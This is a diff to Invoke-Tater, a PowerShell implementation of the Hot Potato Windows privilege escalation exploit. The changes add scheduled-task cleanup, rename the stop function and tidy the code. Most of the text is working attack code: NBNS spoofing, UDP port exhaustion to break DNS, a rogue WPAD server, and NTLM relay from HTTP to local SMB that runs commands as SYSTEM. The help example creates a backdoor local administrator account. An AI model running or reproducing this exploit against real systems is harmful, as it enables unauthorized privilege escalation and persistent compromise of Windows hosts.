@@ -5,10 +5,10 @@ Function Invoke-Tater
 Invoke-Tater is a PowerShell implementation of the Hot Potato Windows Privilege Escalation exploit from @breenmachine and @foxglovesec.
 
 .DESCRIPTION
-Invoke-Tater is a PowerShell implementation of the Hot Potato Windows Privilege Escalation exploit from @breenmachine and @foxglovesec. It has functionality similiar to Potato.exe available at https://github.com/foxglovesec/Potato.
+Invoke-Tater is a PowerShell implementation of the Hot Potato Windows Privilege Escalation with functionality similiar to Potato.exe available at https://github.com/foxglovesec/Potato.
 
 .PARAMETER IP
-Specify a specific local IP address.
+Specify a specific local IP address. An IP address will be selected automatically if this parameter is not used. 
 
 .PARAMETER SpooferIP
 Specify an IP address for NBNS spoofing. This is needed when using two hosts to get around an in-use port 80 on the privesc target. 
@@ -23,16 +23,16 @@ Default = Enabled: (Y/N) Enable/Disable NBNS bruteforce spoofing.
 Default = Enabled: (Y/N) Enable/Disable NBNS bruteforce spoofer limiting to stop NBNS spoofing while hostname is resolving correctly.
 
 .PARAMETER ExhaustUDP
-Default = Disabled: Enable/Disable UDP port exhaustion to force all DNS lookups to fail in order to fallback to NBNS resolution.
+Default = Disabled: (Y/N) Enable/Disable UDP port exhaustion to force all DNS lookups to fail in order to fallback to NBNS resolution.
 
 .PARAMETER HTTPPort
-Default = 80: Specify a TCP port for HTTP listener and redirect response.
+Default = 80: Specify a TCP port for the HTTP listener and redirect response.
 
 .PARAMETER Hostname
-Default = WPAD: Hostname to spoof. "WPAD.DOMAIN.TLD" is required by Windows Server 2008.
+Default = WPAD: Hostname to spoof. WPAD.DOMAIN.TLD may be required by Windows Server 2008.
 
 .PARAMETER WPADDirectHosts
-Comma separated list of hosts to list as direct in the wpad.dat file. Note that 'localhost' is always listed as direct.
+Comma separated list of hosts to list as direct in the wpad.dat file. Note that localhost is always listed as direct.
 
 .PARAMETER WPADPort
 Default = 80: Specify a proxy server port to be included in a the wpad.dat file.
@@ -40,20 +40,20 @@ Default = 80: Specify a proxy server port to be included in a the wpad.dat file.
 .PARAMETER Trigger
 Default = 1: Trigger type to use in order to trigger HTTP to SMB relay. 0 = None, 1 = Windows Defender Signature Update, 2 = Windows 10 Webclient/Scheduled Task
 
+.PARAMETER TaskDelete
+Default = Tater: (Y/N) Enable/Disable scheduled task deletion for trigger 2. If enabled, a random string will be added to the taskname to avoid failures after multiple trigger 2 runs. 
+
 .PARAMETER Taskname
-Default = omg: Scheduled task name to use with trigger 2.
+Default = Tater: Scheduled task name to use with trigger 2. If you observe that Tater does not work after multiple trigger 2 runs, try changing the taskname. 
 
 .PARAMETER RunTime
 (Integer) Set the run time duration in minutes.
 
 .PARAMETER ConsoleOutput
-Default = Disabled: (Y/N) Enable/Disable real time console output. If using this option through a shell, test to ensure that it doesn't hang the shell.
-
-.PARAMETER FileOutput
-Default = Disabled: (Y/N) Enable/Disable real time file output.
+Default = Enabled: (Y/N) Enable/Disable real time console output. If using this option through a shell, test to ensure that it doesn't hang the shell.
 
 .PARAMETER StatusOutput
-Default = Enabled: (Y/N) Enable/Disable startup and shutdown messages.
+Default = Enabled: (Y/N) Enable/Disable startup status messages.
 
 .PARAMETER ShowHelp
 Default = Enabled: (Y/N) Enable/Disable the help messages at startup.
@@ -62,11 +62,10 @@ Default = Enabled: (Y/N) Enable/Disable the help messages at startup.
 Default = 0: (0,1,2) Enable/Disable features for better operation through external tools such as Metasploit's Interactive Powershell Sessions and Empire. 0 = None, 1 = Metasploit, 2 = Empire  
 
 .EXAMPLE
-Invoke-Tater -Command "net user Dave Winter2016 /add && net localgroup administrators Dave /add"
+Invoke-Tater -Command "net user Tater Spring2016 /add && net localgroup administrators Tater /add"
 
 .LINK
 https://github.com/Kevin-Robertson/Tater
-
 #>
 
 # Default parameter values can be modified in this section 
@@ -78,6 +77,7 @@ param
     [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$ConsoleOutput="Y",
     [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$StatusOutput="Y",
     [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$ShowHelp="Y",
+    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$TaskDelete="Y",
     [parameter(Mandatory=$false)][ValidateSet("0","1","2")][string]$Tool="0",
     [parameter(Mandatory=$false)][ValidateScript({$_ -match [IPAddress]$_ })][string]$IP="",
     [parameter(Mandatory=$false)][ValidateScript({$_ -match [IPAddress]$_ })][string]$SpooferIP="127.0.0.1",
@@ -99,7 +99,7 @@ if ($invalid_parameter)
 
 if(!$IP)
 { 
-    $IP = (Test-Connection 127.0.0.1 -count 1 | select -ExpandProperty Ipv4Address)
+    $IP = (Test-Connection 127.0.0.1 -count 1 | Select-Object -ExpandProperty Ipv4Address)
 }
 
 if(!$Command)
@@ -107,25 +107,18 @@ if(!$Command)
     Throw "You must specify an -Command if enabling -SMBRelay"
 }
 
-if(!$tater)
-{
-    $global:tater = [hashtable]::Synchronized(@{})
-}
-
 if($tater.running)
 {
     Throw "Invoke-Tater is already running, use Stop-Tater"
 }
 
+$global:tater = [hashtable]::Synchronized(@{})
+
+$tater.running = $true
 $tater.console_queue = New-Object System.Collections.ArrayList
 $tater.status_queue = New-Object System.Collections.ArrayList
-$tater.console_output = $true
 $tater.console_input = $true
-$tater.running = $true
-$tater.exhaust_UDP_running = $false
-$tater.hostname_spoof = $false
 $tater.SMB_relay_active_step = 0
-$tater.SMB_relay = $true
 $tater.trigger = $Trigger
 
 if($StatusOutput -eq 'y')
@@ -216,8 +209,20 @@ elseif($Trigger -eq 1)
 elseif($Trigger -eq 2)
 {
     $tater.status_queue.add("Scheduled Task Trigger Enabled")|Out-Null
-    $tater.status_queue.add("Scheduled Task = $Taskname")|Out-Null
-    $tater.taskname = $Taskname
+    $tater.taskname = $Taskname -replace " ","_"
+    
+    if($TaskDelete -eq 'y')
+    {
+        $tater.status_queue.add("Scheduled Task Prefix = $Taskname")|Out-Null 
+        $tater.status_queue.add("Scheduled Task Deletion Enabled")|Out-Null
+        $tater.task_delete = $true
+    }
+    else
+    {
+        $tater.status_queue.add("Scheduled Task = $Taskname")|Out-Null
+        $tater.status_queue.add("Scheduled Task Deletion Disabled")|Out-Null
+        $tater.task_delete = $false
+    }
 }
 
 if($ConsoleOutput -eq 'y')
@@ -267,28 +272,16 @@ if($tater.status_output)
     }
 }
 
-$process_ID = [System.Diagnostics.Process]::GetCurrentProcess() |select -expand id
+$process_ID = [System.Diagnostics.Process]::GetCurrentProcess() | Select-Object -expand id
 $process_ID = [BitConverter]::ToString([BitConverter]::GetBytes($process_ID))
 $process_ID = $process_ID -replace "-00-00",""
-[Byte[]]$tater.process_ID_bytes = $process_ID.Split("-") | FOREACH{[CHAR][CONVERT]::toint16($_,16)}
+[Byte[]]$tater.process_ID_bytes = $process_ID.Split("-") | ForEach-Object{[CHAR][CONVERT]::toint16($_,16)}
 
 # Begin ScriptBlocks
 
 # Shared Basic Functions ScriptBlock
 $shared_basic_functions_scriptblock =
 {
-    Function DataToUInt16($field)
-    {
-	   [Array]::Reverse($field)
-	   return [BitConverter]::ToUInt16($field,0)
-    }
-
-    Function DataToUInt32($field)
-    {
-	   [Array]::Reverse($field)
-	   return [BitConverter]::ToUInt32($field,0)
-    }
-
     Function DataLength
     {
         param ([int]$length_start,[byte[]]$string_extract_data)
@@ -303,7 +296,7 @@ $shared_basic_functions_scriptblock =
 
         $string_data = [System.BitConverter]::ToString($string_extract_data[($string_start+$string2_length+$string3_length)..($string_start+$string_length+$string2_length+$string3_length-1)])
         $string_data = $string_data -replace "-00",""
-        $string_data = $string_data.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
+        $string_data = $string_data.Split("-") | ForEach-Object{ [CHAR][CONVERT]::toint16($_,16)}
         $string_extract = New-Object System.String ($string_data,0,$string_data.Length)
         return $string_extract
     }
@@ -324,9 +317,9 @@ $shared_basic_functions_scriptblock =
         [DNSAPI.Flush]::FlushResolverCache()
     }
 
-    Function HTTPListenerStop
+    Function StopTater
     {
-        $tater.console_queue.add("$(Get-Date -format 's') - Attempting to stop HTTP listener")
+        $tater.console_queue.add("$(Get-Date -format 's') - Stopping HTTP listener")
         $tater.HTTP_client.Close()
         start-sleep -s 1
         $tater.HTTP_listener.server.blocking = $false
@@ -334,6 +327,58 @@ $shared_basic_functions_scriptblock =
         $tater.HTTP_listener.server.Close()
         Start-Sleep -s 1
         $tater.HTTP_listener.Stop()
+
+        if($tater.SMBRelay_success)
+        {  
+            if($tater.trigger -eq 2)
+            {
+                if($tater.task_delete -and $tater.task_added)
+                {
+                    $scheduled_task_deleted = $false
+                    $schedule_service = new-object -com("Schedule.Service")
+                    $schedule_service.connect()
+                    $scheduled_task_folder = $schedule_service.getfolder("\")
+                    $scheduled_task_list = $scheduled_task_folder.gettasks(1)
+
+                    foreach($scheduled_task in $scheduled_task_list)
+                    {
+                        if($scheduled_task.name -eq $tater.task)
+                        {
+                            $scheduled_task_folder.DeleteTask($scheduled_task.name,0)
+                        }
+                    }
+
+                    ForEach($scheduled_task in $scheduled_task_list)
+                    {
+                        if($scheduled_task.name -eq $tater.task)
+                        {
+                            $scheduled_task_deleted = $true
+                        }
+                    }
+
+                    if($scheduled_task_deleted)
+                    {
+                        $tater.console_queue.add("$(Get-Date -format 's') - Scheduled task " + $tater.task + " deleted successfully") 
+                    }
+                    else
+                    {
+                        $tater.console_queue.add("$(Get-Date -format 's') - Scheduled task " + $tater.task + " deletion failed, remove manually")
+                    }
+                }
+                elseif($tater.task_added)
+                {
+                    $tater.console_queue.add("$(Get-Date -format 's') - Remove scheduled task " + $tater.task + " manually when finished")
+                }
+            }
+
+        $tater.console_queue.add("$(Get-Date -format 's') - Tater was successful and has exited")
+        }
+        else
+        {
+            $tater.console_queue.add("$(Get-Date -format 's') - Tater was not successful and has exited")
+        }
+
+        Start-Sleep -s 1 
         $tater.running = $false
     }
 }
@@ -386,19 +431,15 @@ $SMB_relay_challenge_scriptblock =
                 }
                 
                 1 { 
-                    $SMB_length_1 = '0x{0:X2}' -f ($HTTP_request_bytes.length + 32)
-                    $SMB_length_2 = '0x{0:X2}' -f ($HTTP_request_bytes.length + 22)
-                    $SMB_length_3 = '0x{0:X2}' -f ($HTTP_request_bytes.length + 2)
-                    $SMB_NTLMSSP_length = '0x{0:X2}' -f ($HTTP_request_bytes.length)
                     $SMB_blob_length = [BitConverter]::ToString([BitConverter]::GetBytes($HTTP_request_bytes.length))
                     $SMB_blob_length = $SMB_blob_length -replace "-00-00",""
-                    $SMB_blob_length = $SMB_blob_length.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
+                    $SMB_blob_length = $SMB_blob_length.Split("-") | ForEach-Object{ [CHAR][CONVERT]::toint16($_,16)}
                     $SMB_byte_count = [BitConverter]::ToString([BitConverter]::GetBytes($HTTP_request_bytes.length + 28))
                     $SMB_byte_count = $SMB_byte_count -replace "-00-00",""
-                    $SMB_byte_count = $SMB_byte_count.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
+                    $SMB_byte_count = $SMB_byte_count.Split("-") | ForEach-Object{ [CHAR][CONVERT]::toint16($_,16)}
                     $SMB_netbios_length = [BitConverter]::ToString([BitConverter]::GetBytes($HTTP_request_bytes.length + 87))
                     $SMB_netbios_length = $SMB_netbios_length -replace "-00-00",""
-                    $SMB_netbios_length = $SMB_netbios_length.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
+                    $SMB_netbios_length = $SMB_netbios_length.Split("-") | ForEach-Object{ [CHAR][CONVERT]::toint16($_,16)}
                     [array]::Reverse($SMB_netbios_length)
                     
                     [Byte[]] $SMB_relay_challenge_send = (0x00,0x00)`
@@ -443,13 +484,13 @@ $SMB_relay_response_scriptblock =
         
         $SMB_blob_length = [BitConverter]::ToString([BitConverter]::GetBytes($HTTP_request_bytes.length))
         $SMB_blob_length = $SMB_blob_length -replace "-00-00",""
-        $SMB_blob_length = $SMB_blob_length.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
+        $SMB_blob_length = $SMB_blob_length.Split("-") | ForEach-Object{ [CHAR][CONVERT]::toint16($_,16)}
         $SMB_byte_count = [BitConverter]::ToString([BitConverter]::GetBytes($HTTP_request_bytes.length + 28))
         $SMB_byte_count = $SMB_byte_count -replace "-00-00",""
-        $SMB_byte_count = $SMB_byte_count.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
+        $SMB_byte_count = $SMB_byte_count.Split("-") | ForEach-Object{ [CHAR][CONVERT]::toint16($_,16)}
         $SMB_netbios_length = [BitConverter]::ToString([BitConverter]::GetBytes($HTTP_request_bytes.length + 88))
         $SMB_netbios_length = $SMB_netbios_length -replace "-00-00",""
-        $SMB_netbios_length = $SMB_netbios_length.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
+        $SMB_netbios_length = $SMB_netbios_length.Split("-") | ForEach-Object{ [CHAR][CONVERT]::toint16($_,16)}
         [array]::Reverse($SMB_netbios_length)
         $j = 0
 
@@ -496,17 +537,17 @@ $SMB_relay_execute_scriptblock =
 
         $SMB_relay_failed = $false
         $SMB_relay_execute_bytes = New-Object System.Byte[] 1024
-        $SMB_service_random = [String]::Join("00-", (1..20 | % {"{0:X2}-" -f (Get-Random -Minimum 65 -Maximum 90)}))
+        $SMB_service_random = [String]::Join("00-", (1..20 | ForEach-Object{"{0:X2}-" -f (Get-Random -Minimum 65 -Maximum 90)}))
         $SMB_service = $SMB_service_random -replace "-00",""
         $SMB_service = $SMB_service.Substring(0,$SMB_service.Length-1)
-        $SMB_service = $SMB_service.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
+        $SMB_service = $SMB_service.Split("-") | ForEach-Object{ [CHAR][CONVERT]::toint16($_,16)}
         $SMB_service = New-Object System.String ($SMB_service,0,$SMB_service.Length)
         $SMB_service_random += '00-00-00'
-        [Byte[]]$SMB_service_bytes = $SMB_service_random.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
-        $SMB_referent_ID_bytes = [String](1..4 | % {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
-        $SMB_referent_ID_bytes = $SMB_referent_ID_bytes.Split(" ") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
+        [Byte[]]$SMB_service_bytes = $SMB_service_random.Split("-") | ForEach-Object{ [CHAR][CONVERT]::toint16($_,16)}
+        $SMB_referent_ID_bytes = [String](1..4 | ForEach-Object{"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
+        $SMB_referent_ID_bytes = $SMB_referent_ID_bytes.Split(" ") | ForEach-Object{ [CHAR][CONVERT]::toint16($_,16)}
         $Command = "%COMSPEC% /C `"" + $Command + "`""
-        [System.Text.Encoding]::ASCII.GetBytes($Command) | % { $SMB_relay_command += "{0:X2}-00-" -f $_ }
+        [System.Text.Encoding]::UTF8.GetBytes($Command) | ForEach-Object{ $SMB_relay_command += "{0:X2}-00-" -f $_ }
 
         if([bool]($Command.length%2))
         {
@@ -517,7 +558,7 @@ $SMB_relay_execute_scriptblock =
             $SMB_relay_command += '00-00-00-00'
         }    
         
-        [Byte[]]$SMB_relay_command_bytes = $SMB_relay_command.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
+        [Byte[]]$SMB_relay_command_bytes = $SMB_relay_command.Split("-") | ForEach-Object{ [CHAR][CONVERT]::toint16($_,16)}
         $SMB_service_data_length_bytes = [BitConverter]::GetBytes($SMB_relay_command_bytes.length + $SMB_service_bytes.length + 237)
         $SMB_service_data_length_bytes = $SMB_service_data_length_bytes[2..0]
         $SMB_service_byte_count_bytes = [BitConverter]::GetBytes($SMB_relay_command_bytes.length + $SMB_service_bytes.length + 237 - 63)
@@ -722,7 +763,6 @@ $SMB_relay_execute_scriptblock =
             elseif((!$SMB_relay_failed) -and ($k -eq 9))
             {
                 $tater.console_queue.add("$(Get-Date -format 's') - Command likely executed on $SMBRelayTarget")
-                $tater.SMB_relay = $false
             }
             elseif((!$SMB_relay_failed) -and ($k -eq 11))
             {
@@ -756,7 +796,7 @@ $SMB_relay_execute_scriptblock =
     }
 }
 
-# HTTP/HTTPS Server ScriptBlock - HTTP/HTTPS listener
+# HTTP Server ScriptBlock - HTTP listener
 $HTTP_scriptblock = 
 { 
     param ($Command,$HTTPPort,$WPADDirectHosts,$WPADPort)
@@ -767,7 +807,7 @@ $HTTP_scriptblock =
         $HTTP_timestamp = Get-Date
         $HTTP_timestamp = $HTTP_timestamp.ToFileTime()
         $HTTP_timestamp = [BitConverter]::ToString([BitConverter]::GetBytes($HTTP_timestamp))
-        $HTTP_timestamp = $HTTP_timestamp.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
+        $HTTP_timestamp = $HTTP_timestamp.Split("-") | ForEach-Object{ [CHAR][CONVERT]::toint16($_,16)}
 
         [byte[]]$HTTP_NTLM_bytes = (0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,0x02,0x00,0x00,0x00,0x06,0x00,0x06,0x00,0x38,0x00,0x00,0x00,0x05,0xc2,0x89,0xa2)`
             + $HTTP_challenge_bytes`
@@ -789,30 +829,30 @@ $HTTP_scriptblock =
 
     $SMBRelayTarget = "127.0.0.1"
 
-    $HTTP_port_bytes = [System.Text.Encoding]::ASCII.GetBytes($HTTPPort)
+    $HTTP_port_bytes = [System.Text.Encoding]::UTF8.GetBytes($HTTPPort)
     
     $WPADDirectHosts += "localhost"
 
     $HTTP_content_length = $WPADPort.length + 62
 
-    foreach($WPAD_direct_host in $WPADDirectHosts)
+    ForEach($WPAD_direct_host in $WPADDirectHosts)
     {
         $HTTP_content_length += $WPAD_direct_host.length + 43
-        $HTTP_content_length_bytes = [System.Text.Encoding]::ASCII.GetBytes($HTTP_content_length)
-        $WPAD_direct_host_bytes = [System.Text.Encoding]::ASCII.GetBytes($WPAD_direct_host)
+        $HTTP_content_length_bytes = [System.Text.Encoding]::UTF8.GetBytes($HTTP_content_length)
+        $WPAD_direct_host_bytes = [System.Text.Encoding]::UTF8.GetBytes($WPAD_direct_host)
         $WPAD_direct_host_function_bytes = (0x69,0x66,0x20,0x28,0x64,0x6e,0x73,0x44,0x6f,0x6d,0x61,0x69,0x6e,0x49,0x73,0x28,0x68,0x6f,0x73,0x74,0x2c,0x20,0x22)`
             + $WPAD_direct_host_bytes`
             +(0x22,0x29,0x29,0x20,0x72,0x65,0x74,0x75,0x72,0x6e,0x20,0x22,0x44,0x49,0x52,0x45,0x43,0x54,0x22,0x3b)
         $WPAD_direct_hosts_bytes += $WPAD_direct_host_function_bytes
     }
 
-    $WPAD_port_bytes = [System.Text.Encoding]::ASCII.GetBytes($WPADPort)
+    $WPAD_port_bytes = [System.Text.Encoding]::UTF8.GetBytes($WPADPort)
     
     :HTTP_listener_loop while ($tater.running)
     {
         if($tater.SMBRelay_success)
         {
-            HTTPListenerStop
+            StopTater
         }
 
         $TCP_request = $NULL
@@ -831,7 +871,7 @@ $HTTP_scriptblock =
 
             if($tater.SMBRelay_success)
             {
-                HTTPListenerStop
+                StopTater
             }
         }
 
@@ -851,7 +891,7 @@ $HTTP_scriptblock =
         if($TCP_request -like "47-45-54-20*" -or $TCP_request -like "48-45-41-44-20*" -or $TCP_request -like "4f-50-54-49-4f-4e-53-20*")
         {
             $HTTP_raw_URL = $TCP_request.Substring($TCP_request.IndexOf("-20-") + 4,$TCP_request.Substring($TCP_request.IndexOf("-20-") + 1).IndexOf("-20-") - 3)
-            $HTTP_raw_URL = $HTTP_raw_URL.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
+            $HTTP_raw_URL = $HTTP_raw_URL.Split("-") | ForEach-Object{ [CHAR][CONVERT]::toint16($_,16)}
             $tater.request_RawUrl = New-Object System.String ($HTTP_raw_URL,0,$HTTP_raw_URL.Length)
         
             if($tater.request_RawUrl -eq "")
@@ -864,7 +904,7 @@ $HTTP_scriptblock =
         {
             $HTTP_authorization_header = $TCP_request.Substring($TCP_request.IndexOf("-41-75-74-68-6F-72-69-7A-61-74-69-6F-6E-3A-20-") + 46)
             $HTTP_authorization_header = $HTTP_authorization_header.Substring(0,$HTTP_authorization_header.IndexOf("-0D-0A-"))
-            $HTTP_authorization_header = $HTTP_authorization_header.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
+            $HTTP_authorization_header = $HTTP_authorization_header.Split("-") | ForEach-Object{ [CHAR][CONVERT]::toint16($_,16)}
             $authentication_header = New-Object System.String ($HTTP_authorization_header,0,$HTTP_authorization_header.Length)
         }
         else
@@ -933,7 +973,7 @@ $HTTP_scriptblock =
             if ($HTTP_request_bytes[8] -eq 1)
             {
 
-                if($tater.SMB_relay -and $tater.SMB_relay_active_step -eq 0)
+                if($tater.SMB_relay_active_step -eq 0)
                 {
                     $tater.SMB_relay_active_step = 1
                     $tater.console_queue.add("$(Get-Date -format 's') - $HTTP_type to SMB relay triggered by " + $tater.HTTP_client.Client.RemoteEndpoint.Address)
@@ -1025,8 +1065,7 @@ $HTTP_scriptblock =
                     $HTTP_NTLM_user_string = DataToString $HTTP_NTLM_user_length $HTTP_NTLM_domain_length 0 $HTTP_NTLM_domain_offset $HTTP_request_bytes
                     $HTTP_NTLM_host_string = DataToString $HTTP_NTLM_host_length $HTTP_NTLM_domain_length $HTTP_NTLM_user_length $HTTP_NTLM_domain_offset $HTTP_request_bytes
                 }
-
-                $NTLM_type = "NTLMv2"           
+          
                 $NTLM_response = [System.BitConverter]::ToString($HTTP_request_bytes[$HTTP_NTLM_offset..($HTTP_NTLM_offset + $HTTP_NTLM_length)]) -replace "-",""
                 $NTLM_response = $NTLM_response.Insert(32,':')
                 
@@ -1034,7 +1073,7 @@ $HTTP_scriptblock =
                 $HTTP_response_phrase = (0x4f,0x4b)
                 $NTLM_challenge = ''
                 
-                if (($tater.SMB_relay) -and ($tater.SMB_relay_active_step -eq 3))
+                if ($tater.SMB_relay_active_step -eq 3)
                 {
                     $tater.console_queue.add("$(Get-Date -format 's') - Sending response for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string for relay to $SMBRelaytarget")
                     $SMB_relay_response_return_bytes = SMBRelayResponse $SMB_relay_socket $HTTP_request_bytes $SMB_user_ID
@@ -1178,7 +1217,7 @@ $exhaust_UDP_scriptblock =
 
         try
         {
-            $host_lookup = [System.Net.Dns]::GetHostEntry("microsoft.com")
+            [System.Net.Dns]::GetHostEntry("microsoft.com")
         }
         catch
         {
@@ -1189,7 +1228,7 @@ $exhaust_UDP_scriptblock =
 
         $tater.console_queue.add("$(Get-Date -format 's') - DNS lookup succeeded so UDP exhaustion failed")
 
-        foreach ($UDP_port in $UDP_failed_ports_list)
+        ForEach ($UDP_port in $UDP_failed_ports_list)
         {
             try
             {
@@ -1217,10 +1256,10 @@ $spoofer_scriptblock =
 
     [Byte[]]$hostname_bytes = (0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x41,0x41,0x00)
 
-    $hostname_encoded = [System.Text.Encoding]::ASCII.GetBytes($Hostname)
+    $hostname_encoded = [System.Text.Encoding]::UTF8.GetBytes($Hostname)
     $hostname_encoded = [System.BitConverter]::ToString($hostname_encoded)
     $hostname_encoded = $hostname_encoded.Replace("-","")
-    $hostname_encoded = [System.Text.Encoding]::ASCII.GetBytes($hostname_encoded)
+    $hostname_encoded = [System.Text.Encoding]::UTF8.GetBytes($hostname_encoded)
 
     for ($i=0; $i -lt $hostname_encoded.Count; $i++)
     {
@@ -1286,19 +1325,6 @@ $tater_scriptblock =
 {
     param ($NBNS,$NBNSLimit,$RunTime,$SpooferIP,$Hostname,$HTTPPort)
     
-    Function HTTPListenerStop
-    {
-        $tater.console_queue.add("$(Get-Date -format 's') - Attempting to stop HTTP listener")
-        $tater.HTTP_client.Close()
-        start-sleep -s 1
-        $tater.HTTP_listener.server.blocking = $false
-        Start-Sleep -s 1
-        $tater.HTTP_listener.server.Close()
-        Start-Sleep -s 1
-        $tater.HTTP_listener.Stop()
-        $tater.running = $false
-    }
-
     if($RunTime)
     {    
         $tater_timeout = new-timespan -Minutes $RunTime
@@ -1313,7 +1339,10 @@ $tater_scriptblock =
             {
                 $Hostname_IP = [System.Net.Dns]::GetHostEntry($Hostname).AddressList[0].IPAddressToString
             }
-            catch{}
+            catch
+            {
+                # Don't need output for this
+            }
             
             if($Hostname_IP -eq $SpooferIP)
             {
@@ -1360,43 +1389,51 @@ $tater_scriptblock =
             if($service_webclient.Status -eq 'Stopped')
             {
                 $tater.console_queue.add("$(Get-Date -format 's') - Starting WebClient service")
-                $process_webclient = Start-Process -FilePath "cmd.exe" -Argument "/C pushd \\live.sysinternals.com\tools" -WindowStyle Hidden -passthru -Wait
+                Start-Process -FilePath "cmd.exe" -Argument "/C pushd \\live.sysinternals.com\tools" -WindowStyle Hidden -passthru -Wait
             }
 
-            if($service_webclient.Status -eq 'Running' -and !$scheduled_task_added -and !$tater.SMBRelay_success)
+            if($service_webclient.Status -eq 'Running' -and !$tater.task_added -and !$tater.SMBRelay_success)
             {
                 $timestamp_add = (Get-Date).AddMinutes(1)
                 $timestamp_add_string = $timestamp_add.ToString("HH:mm")
-                $tater.console_queue.add("$(Get-Date -format 's') - Adding scheduled task " + $tater.taskname)
-                $process_scheduled_task = "/C schtasks.exe /Create /TN " + $tater.taskname + " /TR  \\127.0.0.1@$HTTPPort\test /SC ONCE /ST $timestamp_add_string /F"
+                $tater.task = $tater.taskname
+                
+                if($tater.task_delete)
+                {
+                    $tater.task += "_"
+                    $tater.task += Get-Random   
+                }
+
+                $tater.console_queue.add("$(Get-Date -format 's') - Adding scheduled task " + $tater.task)
+                $process_scheduled_task = "/C schtasks.exe /Create /TN " + $tater.task + " /TR  \\127.0.0.1@$HTTPPort\test /SC ONCE /ST $timestamp_add_string /F"
                 Start-Process -FilePath "cmd.exe" -Argument $process_scheduled_task -WindowStyle Hidden -passthru -Wait
                 
                 $schedule_service = new-object -com("Schedule.Service")
                 $schedule_service.connect() 
                 $scheduled_task_list = $schedule_service.getfolder("\").gettasks(1)
 
-                $scheduled_task_added = $false
+                $tater.task_added = $false
 
-                foreach($scheduled_task in $scheduled_task_list)
+                ForEach($scheduled_task in $scheduled_task_list)
                 {
-                    if($scheduled_task.name -eq $tater.taskname)
+                    if($scheduled_task.name -eq $tater.task)
                     {
-                        $scheduled_task_added = $true
+                        $tater.task_added = $true
                     }
                 }
 
                 $schedule_service.Quit()
 
-                if(!$scheduled_task_added -and !$tater.SMBRelay_success)
+                if(!$tater.task_added -and !$tater.SMBRelay_success)
                 {
-                    $tater.console_queue.add("$(Get-Date -format 's') - Adding scheduled task " + $tater.taskname + " failed")
-                    HTTPListenerStop
+                    $tater.console_queue.add("$(Get-Date -format 's') - Adding scheduled task " + $tater.task + " failed")
+                    StopTater
                 }
             }
-            elseif($scheduled_task_added -and (Get-Date) -ge $timestamp_add.AddMinutes(2))
+            elseif($tater.task_added -and (Get-Date) -ge $timestamp_add.AddMinutes(2))
             {
                 $tater.console_queue.add("$(Get-Date -format 's') - Something went wrong with the service")
-                HTTPListenerStop
+                StopTater
             }
         }
 
@@ -1409,7 +1446,7 @@ $tater_scriptblock =
         {
             if($tater_stopwatch.elapsed -ge $tater_timeout)
             {
-                HTTPListenerStop
+                StopTater
             }
         } 
            
@@ -1417,7 +1454,7 @@ $tater_scriptblock =
     }
  }
 
-# HTTP/HTTPS Listener Startup Function 
+# HTTP Listener Startup Function 
 Function HTTPListener()
 {
     if($WPADPort -eq '80')
@@ -1442,7 +1479,7 @@ Function HTTPListener()
     $HTTP_powershell.AddScript($SMB_relay_execute_scriptblock) > $null
     $HTTP_powershell.AddScript($SMB_NTLM_functions_scriptblock) > $null
     $HTTP_powershell.AddScript($HTTP_scriptblock).AddArgument($Command).AddArgument($HTTPPort).AddArgument($WPADDirectHosts).AddArgument($WPADPort) > $null
-    $HTTP_handle = $HTTP_powershell.BeginInvoke()
+    $HTTP_powershell.BeginInvoke() > $null
 }
 
 # Exhaust UDP Startup Function
@@ -1455,7 +1492,7 @@ Function ExhaustUDP()
     $exhaust_UDP_powershell.Runspace = $exhaust_UDP_runspace
     $exhaust_UDP_powershell.AddScript($shared_basic_functions_scriptblock) > $null
     $exhaust_UDP_powershell.AddScript($exhaust_UDP_scriptblock) > $null
-    $exhaust_UDP_handle = $exhaust_UDP_powershell.BeginInvoke()
+    $exhaust_UDP_powershell.BeginInvoke() > $null
 }
 
 # Spoofer Startup Function
@@ -1469,7 +1506,7 @@ Function Spoofer()
     $spoofer_powershell.AddScript($shared_basic_functions_scriptblock) > $null
     $spoofer_powershell.AddScript($SMB_NTLM_functions_scriptblock) > $null
     $spoofer_powershell.AddScript($spoofer_scriptblock).AddArgument($IP).AddArgument($SpooferIP).AddArgument($Hostname).AddArgument($NBNSLimit) > $null
-    $spoofer_handle = $spoofer_powershell.BeginInvoke()
+    $spoofer_powershell.BeginInvoke() > $null
 }
 
 # Tater Loop Function
@@ -1480,8 +1517,9 @@ Function TaterLoop()
     $tater_runspace.SessionStateProxy.SetVariable('tater',$tater)
     $tater_powershell = [powershell]::Create()
     $tater_powershell.Runspace = $tater_runspace
+    $tater_powershell.AddScript($shared_basic_functions_scriptblock) > $null
     $tater_powershell.AddScript($tater_scriptblock).AddArgument($NBNS).AddArgument($NBNSLimit).AddArgument($RunTime).AddArgument($SpooferIP).AddArgument($Hostname).AddArgument($HTTPPort) > $null
-    $tater_handle = $tater_powershell.BeginInvoke()
+    $tater_powershell.BeginInvoke() > $null
 }
 
